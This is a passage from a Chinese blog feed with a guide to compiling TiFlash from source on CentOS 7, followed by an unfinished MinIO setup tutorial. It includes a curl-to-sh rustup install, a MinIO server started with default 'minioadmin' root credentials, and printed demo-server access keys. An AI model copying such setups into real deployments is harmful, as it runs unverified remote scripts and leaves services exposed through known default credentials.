<p>TiFlash 从去年四月一日开源至今已经过去将近一年半，这段时间里 TiFlash 从 <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/release-6.0.0-dmr" >v6.0.0-DMR <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 升级到了 <a class="link"   href="https://docs.pingcap.com/zh/tidb/v7.3/release-7.3.0" >v7.3.0-DMR <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，并增加了若干新特性，比如支持 <a href="https://shawnyan.cn/2022/tidb/tidb-6.0-mpp-window-functions/">MPP 实现窗口函数框架</a> ，新增支持若干<a href="https://shawnyan.cn/2022/tidb/tidb-6.0-tiflash-pushing-down/">算子和函数下推</a> ，支持 AWS S3 算存分离等。先来回顾一下 TiFlash 资源精华帖，<a class="link"   href="https://asktug.com/t/topic/632816" >【重磅消息】TiFlash 终于开源啦！ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，和 TiFlash 时间线。</p>
<img  alt="t2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/20230815-7667aa84-e6e4-4213-8ea5-5dccd9a8a4cf-1692106826893.png"
                      referrerpolicy="no-referrer"
                >
<p>前两篇文章 <a href="https://shawnyan.cn/2023/tidb/tidb-7.x-compile-pd/">《TiDB 源码编译之 PD/TiDB Dashboard 篇》</a> 和 <a href="https://shawnyan.cn/2023/tidb/tidb-7.x-compile-tiup/">《TiDB 源码编译之 TiUP 篇》</a> 分别阐述了如何编译 TiUP、PD 以及 TiDB Dashboard。本文将介绍如何编译 TiFlash，只是本文使用的技术栈与前两篇文章有所不同，建议熟练掌握 Linux 知识和有一定编译经验的小伙伴继续往下浏览。</p>
<h2 id="环境依赖">环境依赖</h2>
<p>如若想成为 TiFlash Committer，首先要有能力编译 TiFlash 源码，并且可以在本地进行 Debug 调试，下面先来看下在本地环境编译源码需要准备哪些依赖包。</p>
<h3 id="0️⃣-编译环境">0️⃣ 编译环境</h3>
<p>写作本文时使用的环境为 CentOS 7.9.2009，8c16g，这个硬件配置勉强够用，期间遇到过资源使用过载导致卡死的情况，如果有条件建议用更好的配置。至于操作系统，CentOS 7.9.2009 的 EOL 时间为 Jun 30th, 2024 ，其上游 RHEL 7.9 的生命周期支持延长到了 June 30, 2028，所以，现在及未来几年 CentOS 7.9.2009 依旧是企业级主流操作系统。</p>
<h3 id="1️⃣-基础工具包">1️⃣ 基础工具包</h3>
<p>安装基础工具包，用于源码编译。其中，<code>devtoolset-10</code> 用于临时调用 gcc 10 来编译 LLVM/Clang，而 <code>ninja-build</code> 用于构建源码工程。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">yum install devtoolset-10 ninja-build</span><br></pre></td></tr></table></figure></div>
<!--
el9: dnf install gcc-toolset-13
-->
<p>查看 Ninja 版本：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ninja --version</span></span><br><span class="line">1.10.2</span><br></pre></td></tr></table></figure></div>
<h3 id="2️⃣-安装-rust-环境">2️⃣ 安装 rust 环境</h3>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">curl https://sh.rustup.rs -sSf | sh -s -- -y --profile minimal --default-toolchain nightly; source $HOME/.cargo/env</span><br></pre></td></tr></table></figure></div>
<p>安装成功。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">  nightly-x86_64-unknown-linux-gnu installed - rustc 1.73.0-nightly (28eb857b9 2023-08-12)</span><br><span class="line"></span><br><span class="line">Rust is installed now. Great!</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">rustc --version</span></span><br><span class="line">rustc 1.73.0-nightly (28eb857b9 2023-08-12)</span><br></pre></td></tr></table></figure></div>
<h3 id="3️⃣-安装-OpenSSL">3️⃣ 安装 OpenSSL</h3>
<p>TiFlash 中，OpenSSL 的版本使用的是 1.1.1 系列，目前尚未升级大版本到 OpenSSL 3.x。<br>
该包与安全性强相关，所以会不断升级小版本，目前应该是 TiDB 全栈升级到 <code>1.1.1t</code> 版本。<br>
安装步骤如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://github.com/openssl/openssl/archive/refs/tags/OpenSSL_1_1_1t.tar.gz</span><br><span class="line">tar zxf OpenSSL_1_1_1t.tar.gz</span><br><span class="line">cd openssl-OpenSSL_1_1_1t</span><br><span class="line">./config --prefix=/opt/openssl --openssldir=/opt/openssl -fPIC no-shared no-afalgeng -static</span><br><span class="line">make</span><br><span class="line">sudo make install_sw install_ssldirs</span><br></pre></td></tr></table></figure></div>
<p>安装完成后查看版本信息。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./openssl version</span></span><br><span class="line">OpenSSL 1.1.1t  7 Feb 2023</span><br></pre></td></tr></table></figure></div>
<h3 id="4️⃣-安装-CMake3-ccmake">4️⃣ 安装 CMake3 / ccmake</h3>
<p>CentOS 7 下默认安装 CMake 2，TiFlash 编译需要 CMake 3.21.0+ 版本，下面步骤为编译安装 CMake 3.22.1。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://github.com/Kitware/CMake/releases/download/v3.22.1/cmake-3.22.1.tar.gz</span><br><span class="line">tar zxf cmake-3.22.1.tar.gz</span><br><span class="line">cd cmake-3.22.1</span><br><span class="line">./configure</span><br><span class="line">gmake</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure></div>
<p>安装完成：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">which</span> cmake</span></span><br><span class="line">/usr/local/bin/cmake</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">cmake --version</span></span><br><span class="line">cmake version 3.22.1</span><br><span class="line"></span><br><span class="line">CMake suite maintained and supported by Kitware (kitware.com/cmake).</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ccmake --version</span></span><br><span class="line">ccmake version 3.22.1</span><br><span class="line"></span><br><span class="line">CMake suite maintained and supported by Kitware (kitware.com/cmake).</span><br></pre></td></tr></table></figure></div>
<h3 id="5️⃣-安装-LLVM-Clang">5️⃣ 安装 LLVM/Clang</h3>
<p>在 CentOS 7 下，gcc 版本为 4.8 过于老旧，需要临时切换到 gcc 10。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">scl <span class="built_in">enable</span> devtoolset-10 bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gcc --version</span></span><br><span class="line">gcc (GCC) 10.2.1 20210130 (Red Hat 10.2.1-11)</span><br><span class="line">Copyright (C) 2020 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br></pre></td></tr></table></figure></div>
<!--
el9: scl enable gcc-toolset-13 bash
-->
<p>下载 LLVM 源码，并进行编译安装。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/llvm/llvm-project --depth=1 -b llvmorg-13.0.0</span><br><span class="line">cd llvm-project</span><br><span class="line">mkdir build</span><br><span class="line">cmake -DCMAKE_BUILD_TYPE=Release -GNinja -S llvm -B build -DLLVM_ENABLE_PROJECTS=&quot;clang;lld&quot; -DLLVM_ENABLE_RUNTIMES=&quot;libcxx;libcxxabi&quot; -DLLVM_TARGETS_TO_BUILD=Native</span><br><span class="line">ninja</span><br><span class="line">sudo ninja install</span><br></pre></td></tr></table></figure></div>
<p>编译日志输出：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@centos7 build]$ ninja</span><br><span class="line">[185/3417] Building CXX object utils/TableGen/CMakeFiles/llvm-tblgen.dir/CodeGenRegisters.cpp.o</span><br><span class="line">In file included from /home/shawnyan/llvm-project/llvm/utils/TableGen/CodeGenRegisters.h:25,</span><br><span class="line">                 from /home/shawnyan/llvm-project/llvm/utils/TableGen/CodeGenRegisters.cpp:14:</span><br><span class="line">/home/shawnyan/llvm-project/llvm/include/llvm/ADT/SparseBitVector.h: In member function &#x27;unsigned int llvm::CodeGenRegister::getWeight(const llvm::CodeGenRegBank&amp;) const&#x27;:</span><br><span class="line">/home/shawnyan/llvm-project/llvm/include/llvm/ADT/SparseBitVector.h:129:15: warning: array subscript 2 is above array bounds of &#x27;const BitWord [2]&#x27; &#123;aka &#x27;const long unsigned int [2]&#x27;&#125; [-Warray-bounds]</span><br><span class="line">  129 |       if (Bits[i] != 0)</span><br><span class="line">      |           ~~~~^</span><br><span class="line">...</span><br><span class="line">-- Could not find ParallelSTL, libc++abi will not attempt to use it but the build may fail if the libc++ in use needs it to be available.</span><br><span class="line">-- Configuring done</span><br><span class="line">-- Generating done</span><br><span class="line">CMake Warning:</span><br><span class="line">  Manually-specified variables were not used by the project:</span><br><span class="line"></span><br><span class="line">    COMPILER_RT_BUILD_BUILTINS</span><br><span class="line">    LLVM_BUILD_TOOLS</span><br><span class="line">    LLVM_CONFIG_PATH</span><br><span class="line">    LLVM_ENABLE_PROJECTS_USED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- Build files have been written to: /home/shawnyan/llvm-project/build/runtimes/runtimes-bins</span><br><span class="line">[3414/3417] Performing build step for &#x27;runtimes&#x27;</span><br><span class="line">[516/516] Linking CXX static library /home/shawnyan/llvm-project/build/lib/x86_64-unknown-linux-gnu/libc++abi.a</span><br><span class="line">[3415/3417] No install step for &#x27;runtimes&#x27;</span><br><span class="line">[3417/3417] Completed &#x27;runtimes&#x27;</span><br></pre></td></tr></table></figure></div>
<p>期间遇到如下报错信息，不知道官方的编译环境是否也存在类似情况，查到一个 <a class="link"   href="https://github.com/kraj/meta-clang/commit/85fb0a622e0e9a7b2bb7e7035d66dab90e0432b4" >workaround <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，增加参数 <code>-DCMAKE_BUILD_WITH_INSTALL_RPATH=ON</code> 来解决问题。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">CMake Error at runtimes/runtimes-bins/libcxx/src/cmake_install.cmake:88 (file):</span><br><span class="line">  file RPATH_CHANGE could not write new RPATH:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  to the file:</span><br><span class="line"></span><br><span class="line">    /usr/local/lib/x86_64-unknown-linux-gnu/libc++.so</span><br><span class="line"></span><br><span class="line">Call Stack (most recent call first):</span><br><span class="line">  runtimes/runtimes-bins/libcxx/cmake_install.cmake:56 (include)</span><br><span class="line">  runtimes/runtimes-bins/cmake_install.cmake:47 (include)</span><br></pre></td></tr></table></figure></div>
<p>需要说明的是，在 TiFlash 新版本中，已经使用 LLVM/Clang 取代 gcc 成为默认编译器，以此来提升编译效率，README 中 gcc 相关内容也已移除。</p>
<p>到此，所有依赖环境准备完成，下面开始正餐，编译 TiFlash 工程。</p>
<h2 id="目标仓库">目标仓库</h2>
<p>TiFlash 的主要编程语言为 C++，准备编译环境用了好几天时间，没有 golang 环境那么简洁清爽，但是在传统思维里，C/Cpp 才是系统工程的正统编程语言，学习成本高些，多花点时间也是正常的。<br>
TiFlash 的目标仓库只有一个 <code>pingcap/tiflash</code>，但其引入了若干模块，所有源码加起来有 3G 多，笔者第一次克隆源码时直接将根目录填满了，所以在下载源码时只需下载一层深度 (<code>--depth=1</code>) 即可，无需下载所有源码仓库的所有版本代码。似有小伙伴在论坛曾言：“TiFlash docker 编译，能下载到宇宙的尽头”。</p>
<h3 id="克隆代码">克隆代码</h3>
<p>克隆 TiFlash 源码，并下载更新 TiFlash 所依赖的子模块。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/shawn0915/tiflash.git --depth=1</span><br><span class="line">cd tiflash/</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新子模块</span></span><br><span class="line">git submodule update --init --recursive --depth=1</span><br></pre></td></tr></table></figure></div>
<p>去年有个帖子提及 TiFlash 的源码仓问题，<a class="link"   href="https://asktug.com/t/topic/902801" >tiflash编译时依赖的三方件 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，当时就在 Gitee 上同步了一套 TiFlash 依赖的子模块，这次撰写文本时做同步时，发现 TiFlash 增加了一些三方依赖。</p>
<p>比如，引入了 <a class="link"   href="https://github.com/pingcap/tiflash/pull/5843" >magic_enum <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 来优化枚举类型转义字符串。<br>
又如，引入了 <a class="link"   href="https://github.com/pingcap/tiflash/pull/6126" >GmSSL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 来支持国密 SM4 算法。<br>
再如，引入一系列 AWS SDK 仓库，来支持 TiFlash 在 AWS 上的万种可能性。</p>
<h3 id="编译代码">编译代码</h3>
<p>得益于 TiFlash 研发攻城狮的优秀成果，TiFlash 工程本身的编译命令简洁明了，只需两步。最终编译 TiFlash 用了半个小时，期间编译日志省略。需要强调的是，编译 TiFlash 过程中还会去 fetch/update 其他源码库，所以可能用到梯子，或者直接可以在海外云上申请服务器进行编译工作。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cmake .. -GNinja -DCMAKE_BUILD_TYPE=RELEASE</span><br><span class="line">ninja tiflash -j 6</span><br></pre></td></tr></table></figure></div>
<p>编译成功，重要成果文件如下。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">root@centos7:/data/tiflash/build$ ll -h /usr/local/lib/x86_64-unknown-linux-gnu/</span><br><span class="line">total 3.9M</span><br><span class="line">-rw-r--r-- 1 root root  1.9M Aug 15 10:47 libc++.a</span><br><span class="line">-rw-r--r-- 1 root root    28 Aug 15 10:47 libc++.so</span><br><span class="line">lrwxrwxrwx 1 root root    13 Aug 14 14:06 libc++.so.1 -&gt; libc++.so.1.0</span><br><span class="line">-rwxr-xr-x 1 root root 1016K Aug 15 10:47 libc++.so.1.0</span><br><span class="line">-rw-r--r-- 1 root root  668K Aug 15 10:47 libc++abi.a</span><br><span class="line">lrwxrwxrwx 1 root root    14 Aug 15 10:03 libc++abi.so -&gt; libc++abi.so.1</span><br><span class="line">lrwxrwxrwx 1 root root    16 Aug 15 10:03 libc++abi.so.1 -&gt; libc++abi.so.1.0</span><br><span class="line">-rwxr-xr-x 1 root root  358K Aug 15 10:47 libc++abi.so.1.0</span><br><span class="line">-rw-r--r-- 1 root root   13K Aug 15 10:47 libc++experimental.a</span><br><span class="line">root@centos7:/data/tiflash/build$ ll -h ./contrib/GmSSL/lib/libgmssl*</span><br><span class="line">lrwxrwxrwx 1 root root    13 Aug 15 13:07 ./contrib/GmSSL/lib/libgmssl.so -&gt; libgmssl.so.3</span><br><span class="line">lrwxrwxrwx 1 root root    15 Aug 15 13:07 ./contrib/GmSSL/lib/libgmssl.so.3 -&gt; libgmssl.so.3.0</span><br><span class="line">-rwxr-xr-x 1 root root  822K Aug 15 13:07 ./contrib/GmSSL/lib/libgmssl.so.3.0</span><br><span class="line">root@centos7:/data/tiflash/build$ ll -h ./contrib/tiflash-proxy-cmake/release/lib*.so</span><br><span class="line">-rwxr-xr-x 2 root root   87M Aug 15 13:34 ./contrib/tiflash-proxy-cmake/release/libraftstore_proxy.so</span><br><span class="line">-rwxr-xr-x 1 root root   87M Aug 15 13:34 ./contrib/tiflash-proxy-cmake/release/libtiflash_proxy.so</span><br><span class="line">root@centos7:/data/tiflash/build$ ll -h ./dbms/src/Server/tiflash</span><br><span class="line">-rwxr-xr-x 1 root root  212M Aug 15 13:35 ./dbms/src/Server/tiflash</span><br></pre></td></tr></table></figure></div>
<p>老规矩，尝试自定义版本号，编译完成后，查看 <code>tiflash</code> 可执行二进制文件的版本信息。</p>
<img  alt="t3.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/20230815-d3618dc3-f9c0-4f28-bc01-367fb171cb2d-1692106845635.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="遗留问题">遗留问题</h2>
<h3 id="1-CMake-版本选择">1. CMake 版本选择</h3>
<p>在 README/CMakeLists.txt 中提示要求 cmake 的最小版本为 3.21，而在 <code>bake_llvm_base_amd64/aarch64.sh</code> 文件中使用的是 <code>3.22.1</code> 版本，是否考虑将 CMake 的版本升级一下？</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">cmake_minimum_required (VERSION <span class="number">3.21</span>)</span><br><span class="line"></span><br><span class="line"># CMake</span><br><span class="line">source $SCRIPTPATH/install_cmake.sh</span><br><span class="line">install_cmake <span class="string">&quot;3.22.1&quot;</span> <span class="string">&quot;x86_64&quot;</span></span><br></pre></td></tr></table></figure></div>
<h3 id="2-编译脚本冗余">2. 编译脚本冗余</h3>
<p><code>release-centos7-llvm/env</code> 路径下的文件有些陈旧，看起来是 dead code，不知是否还有保留的必要。</p>
<p>另外，在帖子 <a class="link"   href="https://asktug.com/t/topic/1010987" >tiflash 源码cmake依赖 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 中有描述到，<code>cmake</code> 命令可能出现找不到的情况，需要修正，不过如果 <code>env</code> 文件夹移除的话，这个问题就伴随解决了。</p>
<h3 id="3-子模块代码仓链接">3. 子模块代码仓链接</h3>
<p>有个细微之处，<a href="https://github.com/pingcap/tiflash/blob/master/.gitmodules#L97"><code>.gitmodules</code></a> 文件中 <code>aws-sdk-cpp</code> 使用的是个人代码仓 (<a class="link"   href="https://github.com/JaySon-Huang/aws-sdk-cpp.git" >https://github.com/JaySon-Huang/aws-sdk-cpp.git <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>) 应该是某位研发大佬的个人账号？既不是公司仓库也不是 AWS 原厂仓库 (<a class="link"   href="https://github.com/aws/aws-sdk-cpp.git" >https://github.com/aws/aws-sdk-cpp.git <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ) ，不知道会不会是误导入。</p>
<h3 id="4-“-”-误用-Fixed">4. “\” 误用 (Fixed)</h3>
<p>文件 <a href="https://github.com/pingcap/tiflash/blob/master/release-centos7-llvm/dockerfiles/misc/prepare_basic.sh#L30"><code>release-centos7-llvm/dockerfiles/misc/prepare_basic.sh</code></a> 第 30 行后面多了一个反斜杠，故，提了个 PR: <a class="link"   href="https://github.com/pingcap/tiflash/pull/7940" > Remove excess backslashes #7940  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Update. 该 PR 已经 merge.</p>
<h2 id="总结">总结</h2>
<p>本文略显“头重脚轻”，是因为准备 TiFlash 的编译环境很折腾，前前后后一周多，对机器性能、网络连通性都要求很高，真的不建议轻易尝试。<br>
不过，好在 TiFlash 已开源并在源码工程文件里提示了近乎完整的编译步骤，据说这也是 TiFlash 产研大神们自用的脚本，Thanks♪(･ω･)ﾉ。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >]]></content>
      <categories>
        <category>TiDB</category>
        <category>TiDB 7.x</category>
      </categories>
      <tags>
        <tag>tidb</tag>
        <tag>compile</tag>
        <tag>tiflash</tag>
        <tag>tidb 7.x</tag>
        <tag>cmake</tag>
      </tags>
  </entry>
  <entry>
    <title>浅尝 MinIO 存储</title>
    <url>/2023/other/minio-intro/</url>
    <content><![CDATA[<p>MinIO 是一个开源的分布式对象存储服务，使用 Golang 编写，支持 S3 兼容的对象存储协议。MinIO 旨在为用户提供简单、高效、可靠的对象存储服务，可以用于构建云存储、数据备份和容灾等应用。本文将介绍 MinIO 的安装和配置方法，并通过一个简单的示例演示如何使用 MinIO 进行对象存储。</p>
<img  alt="minio0.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230809-508f6079-3aec-423d-8623-43a7506c4ffd.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="安装-MinIO">安装 MinIO</h2>
<p>本文使用的是 MinIO 当前最新版本 <code>RELEASE.2023-08-04T17-40-21Z</code></p>
<ul>
<li>二进制安装</li>
</ul>
<p>从官方网站下载 MinIO 的安装包，根据操作系统选择相应的版本。<br>
解压安装包，并将执行文件路径添加到系统环境变量中，以便在命令行中访问 MinIO 命令。<br>
启动 MinIO 服务，使用以下命令：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">minio server /path/to/mount</span><br></pre></td></tr></table></figure></div>
<p>其中，/path/to/mount 是你要存储数据的目录。</p>
<ul>
<li>Docker 开箱即用</li>
</ul>
<p>当然，可以更简便的使用 docker 来启动 MinIO 服务。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull minio/minio</span><br><span class="line"></span><br><span class="line">mkdir -p ~/minio/data</span><br><span class="line"></span><br><span class="line">docker run \</span><br><span class="line">   -p 9000:9000 \</span><br><span class="line">   -p 9090:9090 \</span><br><span class="line">   --name minio \</span><br><span class="line">   -v ~/minio/data:/data \</span><br><span class="line">   -e &quot;MINIO_ROOT_USER=minioadmin&quot; \</span><br><span class="line">   -e &quot;MINIO_ROOT_PASSWORD=minioadmin&quot; \</span><br><span class="line">   minio/minio server /data --console-address &quot;:9090&quot;</span><br></pre></td></tr></table></figure></div>
<h2 id="运行-MinIO">运行 MinIO</h2>
<p>创建好数据目录，并下载好 docker 镜像就可以启动了。启动日志如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@centos7 ~]$ docker run \</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">   -p 9000:9000 \</span></span><br><span class="line"><span class="language-bash">&gt;    -p 9090:9090 \</span></span><br><span class="line"><span class="language-bash">&gt;    --name minio \</span></span><br><span class="line"><span class="language-bash">&gt;    -v ~/minio/data:/data \</span></span><br><span class="line"><span class="language-bash">&gt;    -e <span class="string">&quot;MINIO_ROOT_USER=minioadmin&quot;</span> \</span></span><br><span class="line"><span class="language-bash">&gt;    -e <span class="string">&quot;MINIO_ROOT_PASSWORD=minioadmin&quot;</span> \</span></span><br><span class="line"><span class="language-bash">&gt;    minio/minio server /data --console-address <span class="string">&quot;:9090&quot;</span></span></span><br><span class="line">WARNING: Detected Linux kernel version older than 4.0.0 release, there are some known potential performance problems with this kernel version. MinIO recommends a minimum of 4.x.x linux kernel version for best performance</span><br><span class="line">Formatting 1st pool, 1 set(s), 1 drives per set.</span><br><span class="line">WARNING: Host local has more than 0 drives of set. A host failure will result in data becoming unavailable.</span><br><span class="line">WARNING: Detected default credentials &#x27;minioadmin:minioadmin&#x27;, we recommend that you change these values with &#x27;MINIO_ROOT_USER&#x27; and &#x27;MINIO_ROOT_PASSWORD&#x27; environment variables</span><br><span class="line">MinIO Object Storage Server</span><br><span class="line">Copyright: 2015-2023 MinIO, Inc.</span><br><span class="line">License: GNU AGPLv3 &lt;https://www.gnu.org/licenses/agpl-3.0.html&gt;</span><br><span class="line">Version: RELEASE.2023-08-04T17-40-21Z (go1.19.12 linux/amd64)</span><br><span class="line"></span><br><span class="line">Status:         1 Online, 0 Offline.</span><br><span class="line">S3-API: http://172.17.0.3:9000  http://127.0.0.1:9000</span><br><span class="line">Console: http://172.17.0.3:9090 http://127.0.0.1:9090</span><br><span class="line"></span><br><span class="line">Documentation: https://min.io/docs/minio/linux/index.html</span><br><span class="line">Warning: The standard parity is set to 0. This can lead to data loss.</span><br></pre></td></tr></table></figure></div>
<p>如果一切正常， MinIO 服务将启动并运行在默认的9000端口上。可以通过访问 <code>localhost:9000</code> 来访问 MinIO 的 Web 管理界面。</p>
<img  alt="minio-admin.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230809-0855885d-7e68-4cd6-ba57-5ee9dff96629.png"
                      referrerpolicy="no-referrer"
                >
<p>在 MinIO 的 Web 管理界面上可以直观的进行操作，比如创建存储捅。</p>
<img  alt="minio1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230809-f9517b44-f354-42ff-8bb4-998eec7132d4.png"
                      referrerpolicy="no-referrer"
                >
<p>查看存储桶的状态信息。</p>
<img  alt="minio2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230809-e896c6ec-635e-4847-9072-a2b17cb78ee4.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="使用-MinIO-客户端-mc">使用 MinIO 客户端 mc</h2>
<p>下载 MinIO 客户端二进制文件，并移动到 <code>bin</code> 目录下。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://dl.min.io/client/mc/release/linux-amd64/mc</span><br><span class="line">chmod +x mc</span><br><span class="line">sudo mv mc /usr/local/bin/mc</span><br></pre></td></tr></table></figure></div>
<ul>
<li>通过下面命令进行初始连接配置。</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">mc alias set local http://127.0.0.1:9000 minioadmin minioadmin</span><br><span class="line">mc admin info local</span><br><span class="line">mc config host ls</span><br></pre></td></tr></table></figure></div>
<ul>
<li>查看客户端版本和连接信息。</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@centos7 ~]$ mc --version</span><br><span class="line">mc version RELEASE.2023-08-01T23-30-57Z (commit-id=0a529d5e642f1a50a74b256c683be453e26bf7e9)</span><br><span class="line">Runtime: go1.19.12 linux/amd64</span><br><span class="line">Copyright (c) 2015-2023 MinIO, Inc.</span><br><span class="line">License GNU AGPLv3 &lt;https://www.gnu.org/licenses/agpl-3.0.html&gt;</span><br><span class="line">[shawnyan@centos7 ~]$ mc alias set local http://127.0.0.1:9000 minioadmin minioadmin</span><br><span class="line">mc: Configuration written to `/home/shawnyan/.mc/config.json`. Please update your access credentials.</span><br><span class="line">mc: Successfully created `/home/shawnyan/.mc/share`.</span><br><span class="line">mc: Initialized share uploads `/home/shawnyan/.mc/share/uploads.json` file.</span><br><span class="line">mc: Initialized share downloads `/home/shawnyan/.mc/share/downloads.json` file.</span><br><span class="line">Added `local` successfully.</span><br><span class="line">[shawnyan@centos7 ~]$ mc admin info local</span><br><span class="line">●  127.0.0.1:9000</span><br><span class="line">   Uptime: 1 hour</span><br><span class="line">   Version: 2023-08-04T17:40:21Z</span><br><span class="line">   Network: 1/1 OK</span><br><span class="line">   Drives: 1/1 OK</span><br><span class="line">   Pool: 1</span><br><span class="line"></span><br><span class="line">Pools:</span><br><span class="line">   1st, Erasure sets: 1, Drives per erasure set: 1</span><br><span class="line"></span><br><span class="line">370 KiB Used, 1 Bucket, 1 Object</span><br><span class="line">1 drive online, 0 drives offline</span><br><span class="line">[shawnyan@centos7 ~]$ mc config host ls</span><br><span class="line">gcs</span><br><span class="line">  URL       : https://storage.googleapis.com</span><br><span class="line">  AccessKey : YOUR-ACCESS-KEY-HERE</span><br><span class="line">  SecretKey : YOUR-SECRET-KEY-HERE</span><br><span class="line">  API       : S3v2</span><br><span class="line">  Path      : dns</span><br><span class="line"></span><br><span class="line">local</span><br><span class="line">  URL       : http://127.0.0.1:9000</span><br><span class="line">  AccessKey : minioadmin</span><br><span class="line">  SecretKey : minioadmin</span><br><span class="line">  API       : s3v4</span><br><span class="line">  Path      : auto</span><br><span class="line"></span><br><span class="line">play</span><br><span class="line">  URL       : https://play.min.io</span><br><span class="line">  AccessKey : Q3AM3UQ867SPQQA43P2F</span><br><span class="line">  SecretKey : zuf+tfteSlswRu7BJ86wekitnifILbZam1KYY3TG</span><br><span class="line">  API       : S3v4</span><br><span class="line">  Path      : auto</span><br><span class="line"></span><br><span class="line">s3</span><br><span class="line">  URL       : https://s3.amazonaws.com</span><br><span class="line">  AccessKey : YOUR-ACCESS-KEY-HERE</span><br><span class="line">  SecretKey : YOUR-SECRET-KEY-HERE</span><br><span class="line">  API       : S3v4</span><br><span class="line">  Path      : dns</span><br><span class="line"></span><br><span class="line">[shawnyan@centos7 ~]$</span><br></pre></td></tr></table></figure></div>
<ul>
<li>查看存储目录大小</li>
</ul>
